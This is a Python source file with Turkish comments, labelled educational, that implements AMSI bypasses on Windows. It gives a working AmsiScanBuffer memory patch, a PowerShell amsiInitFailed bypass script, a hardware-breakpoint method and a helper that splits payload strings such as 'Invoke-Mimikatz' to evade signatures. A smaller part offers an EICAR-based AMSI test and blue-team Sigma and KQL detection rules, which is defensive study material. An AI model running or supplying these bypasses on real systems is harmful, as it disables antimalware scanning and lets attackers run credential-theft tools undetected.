"""
Evasion Technique: AMSI Bypass
===============================
Antimalware Scan Interface (AMSI) bypass teknikleri.

MITRE ATT&CK: T1562.001 - Impair Defenses: Disable or Modify Tools

AMSI Nedir:
- PowerShell, VBScript, JScript gibi script engine'lerini tarar
- .NET Assembly.Load() çağrılarını izler
- Fileless malware'e karşı savunma

Bypass Yöntemleri:
1. AmsiScanBuffer Patch - Fonksiyonu bypass et
2. amsiInitFailed Flag - AMSI'yi "başarısız" göster
3. Provider DLL Hijack - Sahte provider yükle
4. Hardware Breakpoint - CPU breakpoint ile bypass

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import struct

# ============================================================================
# EXPLANATION
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                        EVASION: AMSI BYPASS                                   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 AMSI NEDİR?                                                              ║
║  ───────────────                                                             ║
║                                                                              ║
║  AMSI (Antimalware Scan Interface), Windows 10+ ile gelen bir güvenlik       ║
║  API'sidir. Script içeriklerini çalışmadan önce AV'ye taratır.              ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                      AMSI FLOW                                      │    ║
║  │                                                                     │    ║
║  │   PowerShell                                                        │    ║
║  │   ┌────────────────┐                                               │    ║
║  │   │ Invoke-Mimikatz│                                               │    ║
║  │   └───────┬────────┘                                               │    ║
║  │           │                                                         │    ║
║  │           ▼                                                         │    ║
║  │   ┌────────────────┐     ┌──────────────────────┐                  │    ║
║  │   │ amsi.dll       │────►│ AmsiScanBuffer()     │                  │    ║
║  │   │ AmsiScanString │     │ "Invoke-Mimikatz"    │                  │    ║
║  │   └────────────────┘     └──────────┬───────────┘                  │    ║
║  │                                     │                               │    ║
║  │                                     ▼                               │    ║
║  │                          ┌──────────────────────┐                  │    ║
║  │                          │ Windows Defender     │                  │    ║
║  │                          │ Signature Match!     │                  │    ║
║  │                          │ AMSI_RESULT_DETECTED │                  │    ║
║  │                          └──────────┬───────────┘                  │    ║
║  │                                     │                               │    ║
║  │                                     ▼                               │    ║
║  │                          ┌──────────────────────┐                  │    ║
║  │                          │ ❌ SCRIPT BLOCKED!   │                  │    ║
║  │                          └──────────────────────┘                  │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  🔧 BYPASS METHOD 1: AmsiScanBuffer Patch                                    ║
║  ─────────────────────────────────────────                                   ║
║                                                                              ║
║  AmsiScanBuffer fonksiyonunun başına patch yaparak her zaman                 ║
║  AMSI_RESULT_CLEAN döndürmesini sağla:                                       ║
║                                                                              ║
║  Original AmsiScanBuffer:          Patched AmsiScanBuffer:                   ║
║  ┌──────────────────────┐          ┌──────────────────────┐                 ║
║  │ 4C 8B DC   mov r11,rsp│          │ B8 57 00 07 80 mov eax,│                ║
║  │ 49 89 5B   mov [r11], │   ──►    │                0x80070057│              ║
║  │ ...                   │          │ C3          ret         │              ║
║  └──────────────────────┘          └──────────────────────┘                 ║
║                                                                              ║
║  0x80070057 = E_INVALIDARG → AMSI_RESULT_CLEAN olarak yorumlanır            ║
║                                                                              ║
║  🔧 BYPASS METHOD 2: amsiInitFailed                                          ║
║  ────────────────────────────────────                                        ║
║                                                                              ║
║  PowerShell'in internal amsiInitFailed flag'ini true yap:                    ║
║  AMSI hiç başlatılmamış gibi davranır.                                       ║
║                                                                              ║
║  🔧 BYPASS METHOD 3: Hardware Breakpoint                                     ║
║  ────────────────────────────────────────                                    ║
║                                                                              ║
║  AmsiScanBuffer'a CPU hardware breakpoint koy.                               ║
║  VEH (Vectored Exception Handler) ile yakalayıp bypass et.                   ║
║  Memory patch yapmadığı için tespit edilmesi zor.                           ║
║                                                                              ║
║  ⚠️ TESPİT GÖSTERGELERİ:                                                     ║
║  ────────────────────────                                                    ║
║  • amsi.dll'e yazma (VirtualProtect + WriteProcessMemory)                   ║
║  • AmsiScanBuffer'ın hash'inin değişmesi                                     ║
║  • ETW: AMSI event'lerinin durması                                           ║
║  • Hardware breakpoint kullanımı (DR registers)                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# METHOD 1: AmsiScanBuffer Patch
# ============================================================================

def patch_amsi_scan_buffer(verbose: bool = True) -> bool:
    """
    AmsiScanBuffer fonksiyonunu patch ederek bypass yap.
    
    Patch: mov eax, 0x80070057; ret
    Bu değer E_INVALIDARG olup AMSI_RESULT_CLEAN döndürür.
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print("\n🔧 AMSI Bypass: AmsiScanBuffer Patch")
        print("="*60)
    
    # Load amsi.dll
    try:
        amsi = ctypes.WinDLL('amsi')
    except OSError:
        if verbose:
            print("   ⚠️ amsi.dll yüklenemedi (AMSI mevcut değil)")
        return False
    
    # Get AmsiScanBuffer address
    if verbose:
        print("\n[1/3] AmsiScanBuffer adresi alınıyor...")
    
    try:
        amsi_scan_buffer = ctypes.cast(
            amsi.AmsiScanBuffer,
            ctypes.c_void_p
        ).value
    except AttributeError:
        if verbose:
            print("   ❌ AmsiScanBuffer bulunamadı")
        return False
    
    if verbose:
        print(f"   ✅ AmsiScanBuffer: 0x{amsi_scan_buffer:016X}")
    
    # Patch bytes: mov eax, 0x80070057; ret
    # B8 57 00 07 80 C3
    patch = b"\xB8\x57\x00\x07\x80\xC3"
    
    if verbose:
        print(f"\n[2/3] Patch hazırlanıyor...")
        print(f"   📝 Patch: {patch.hex()}")
        print(f"   📝 Assembly: mov eax, 0x80070057; ret")
    
    # Change memory protection
    if verbose:
        print(f"\n[3/3] Memory patch uygulanıyor...")
    
    old_protect = wintypes.DWORD()
    PAGE_EXECUTE_READWRITE = 0x40
    
    result = ctypes.windll.kernel32.VirtualProtect(
        amsi_scan_buffer,
        len(patch),
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )
    
    if not result:
        if verbose:
            print("   ❌ VirtualProtect başarısız")
        return False
    
    # Apply patch
    ctypes.memmove(amsi_scan_buffer, patch, len(patch))
    
    # Restore protection
    ctypes.windll.kernel32.VirtualProtect(
        amsi_scan_buffer,
        len(patch),
        old_protect.value,
        ctypes.byref(old_protect)
    )
    
    if verbose:
        print("   ✅ Patch uygulandı!")
        print("\n" + "="*60)
        print("🎉 AMSI BYPASS BAŞARILI!")
        print("   AmsiScanBuffer artık her zaman CLEAN döndürür")
        print("="*60)
    
    return True

# ============================================================================
# METHOD 2: amsiInitFailed (PowerShell specific)
# ============================================================================

AMSI_INIT_FAILED_PS = '''
# PowerShell AMSI Bypass - amsiInitFailed
# Bu kod PowerShell'de çalıştırılmalı

$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
$b = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
[IntPtr]$c = $b.GetValue($null)
[Int32[]]$d = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)

# veya basit versiyon:
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
'''

# ============================================================================
# METHOD 3: Hardware Breakpoint (Patchless)
# ============================================================================

HARDWARE_BP_INFO = """
📖 HARDWARE BREAKPOINT BYPASS (PATCHLESS)

Memory'yi değiştirmeden AMSI bypass:

1. AmsiScanBuffer adresini al
2. DR0 register'ına bu adresi yaz (hardware breakpoint)
3. Vectored Exception Handler (VEH) register et
4. AmsiScanBuffer çağrıldığında breakpoint tetiklenir
5. VEH handler'da:
   - RAX = AMSI_RESULT_CLEAN (0)
   - RIP = return address (bypass)

Avantajları:
- Memory patch yok
- Integrity check'leri bypass eder
- Daha stealth

Dezavantajları:
- Her thread için ayrı DR register gerekir
- SetThreadContext izlenebilir
"""

# ============================================================================
# METHOD 4: String Obfuscation
# ============================================================================

def obfuscate_amsi_string(payload: str) -> str:
    """
    AMSI signature'larını bypass etmek için string obfuscation.
    
    Örnek: "Invoke-Mimikatz" → "Inv"+"oke-Mimi"+"katz"
    
    Args:
        payload: Orijinal payload
    
    Returns:
        str: Obfuscated payload
    """
    # Simple split obfuscation
    result = []
    chunk_size = 3
    
    for i in range(0, len(payload), chunk_size):
        chunk = payload[i:i+chunk_size]
        result.append(f'"{chunk}"')
    
    return " + ".join(result)

# ============================================================================
# DETECTION & TESTING
# ============================================================================

def test_amsi(verbose: bool = True) -> bool:
    """
    AMSI'nin çalışıp çalışmadığını test et.
    
    Returns:
        bool: AMSI aktif mi?
    """
    if verbose:
        print("\n🔍 AMSI Test")
        print("="*60)
    
    try:
        amsi = ctypes.WinDLL('amsi')
    except OSError:
        if verbose:
            print("   ⚠️ amsi.dll yüklenemedi")
        return False
    
    # AMSI structures
    AMSI_RESULT_CLEAN = 0
    AMSI_RESULT_NOT_DETECTED = 1
    AMSI_RESULT_DETECTED = 32768
    
    # Test string - EICAR-like
    test_string = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    
    if verbose:
        print(f"   Test string: EICAR pattern")
    
    # Initialize AMSI
    amsi_context = ctypes.c_void_p()
    
    result = amsi.AmsiInitialize(
        "TestApp",
        ctypes.byref(amsi_context)
    )
    
    if result != 0:
        if verbose:
            print(f"   ⚠️ AmsiInitialize failed: 0x{result:08X}")
        return False
    
    # Scan
    amsi_result = ctypes.c_int()
    
    result = amsi.AmsiScanBuffer(
        amsi_context,
        test_string,
        len(test_string),
        "test",
        None,
        ctypes.byref(amsi_result)
    )
    
    # Cleanup
    amsi.AmsiUninitialize(amsi_context)
    
    if verbose:
        if amsi_result.value >= AMSI_RESULT_DETECTED:
            print(f"   ✅ AMSI ACTIVE - Malware detected!")
            print(f"   📊 Result: {amsi_result.value}")
        else:
            print(f"   ⚠️ AMSI BYPASSED veya inactive")
            print(f"   📊 Result: {amsi_result.value}")
    
    return amsi_result.value >= AMSI_RESULT_DETECTED

# ============================================================================
# DETECTION RULES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🛡️ BLUE TEAM DETECTION RULES                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 ETW MONITORING:                                                          ║
║  ──────────────────                                                          ║
║                                                                              ║
║  Provider: Microsoft-Antimalware-Scan-Interface                              ║
║  - AMSI scan event'lerinin aniden durması                                    ║
║  - AmsiScanBuffer hata kodları                                               ║
║                                                                              ║
║  📋 SIGMA RULES:                                                             ║
║  ────────────────                                                            ║
║                                                                              ║
║  title: AMSI Bypass via Memory Patch                                         ║
║  logsource:                                                                  ║
║    product: windows                                                          ║
║    category: ps_script_block_logging                                         ║
║  detection:                                                                  ║
║    selection:                                                                ║
║      ScriptBlockText|contains:                                               ║
║        - 'AmsiScanBuffer'                                                    ║
║        - 'amsiInitFailed'                                                    ║
║        - 'AmsiUtils'                                                         ║
║        - 'VirtualProtect'                                                    ║
║    condition: selection                                                      ║
║  level: critical                                                             ║
║                                                                              ║
║  title: AMSI Bypass String Patterns                                          ║
║  detection:                                                                  ║
║    selection:                                                                ║
║      ScriptBlockText|contains:                                               ║
║        - '[Runtime.InteropServices.Marshal]::Copy'                           ║
║        - 'System.Management.Automation.AmsiUtils'                            ║
║        - '.GetField(''amsiInitFailed'                                        ║
║    condition: selection                                                      ║
║                                                                              ║
║  📋 KQL QUERIES:                                                             ║
║  ────────────────                                                            ║
║                                                                              ║
║  // AMSI bypass attempts in PowerShell                                       ║
║  DeviceEvents                                                                ║
║  | where ActionType == "PowerShellCommand"                                   ║
║  | where AdditionalFields has_any ("AmsiScanBuffer", "amsiInitFailed",       ║
║                                    "AmsiUtils", "VirtualProtect")            ║
║                                                                              ║
║  // Memory write to amsi.dll                                                 ║
║  DeviceEvents                                                                ║
║  | where ActionType == "NtProtectVirtualMemoryApiCall"                       ║
║  | where TargetFileName contains "amsi.dll"                                  ║
║                                                                              ║
║  📋 WINDOWS DEFENDER DETECTIONS:                                             ║
║  ─────────────────────────────────                                           ║
║                                                                              ║
║  • Behavior:Win32/AmsiTamper.A                                               ║
║  • Behavior:Win32/AmsiTamper.B                                               ║
║  • HackTool:PowerShell/AMSIBypass                                            ║
║                                                                              ║
║  📋 MEMORY INTEGRITY CHECK:                                                  ║
║  ───────────────────────────                                                 ║
║                                                                              ║
║  AmsiScanBuffer'ın hash'ini periyodik olarak kontrol et:                     ║
║  - Orijinal hash ile karşılaştır                                             ║
║  - Değişiklik tespit edilirse alert                                          ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    print("\n📋 Seçenekler:")
    print("   1. AMSI Test - AMSI aktif mi kontrol et")
    print("   2. Patch Bypass - AmsiScanBuffer patch")
    print("   3. PowerShell Bypass - Script göster")
    print("   4. String Obfuscation - Payload obfuscate et")
    
    choice = input("\nSeçim (1/2/3/4): ").strip()
    
    if choice == "1":
        is_active = test_amsi()
        if is_active:
            print("\n✅ AMSI aktif ve çalışıyor")
        else:
            print("\n⚠️ AMSI aktif değil veya bypass edilmiş")
    
    elif choice == "2":
        confirm = input("⚠️ AMSI patch yapılsın mı? (y/n): ").strip().lower()
        if confirm == 'y':
            patch_amsi_scan_buffer()
            print("\n🔄 Tekrar test ediliyor...")
            test_amsi()
    
    elif choice == "3":
        print("\n📝 PowerShell AMSI Bypass Script:")
        print("="*60)
        print(AMSI_INIT_FAILED_PS)
        print("="*60)
    
    elif choice == "4":
        payload = input("Obfuscate edilecek string: ").strip()
        if payload:
            result = obfuscate_amsi_string(payload)
            print(f"\n📝 Obfuscated: {result}")
    
    print(HARDWARE_BP_INFO)
    print(DETECTION_RULES)
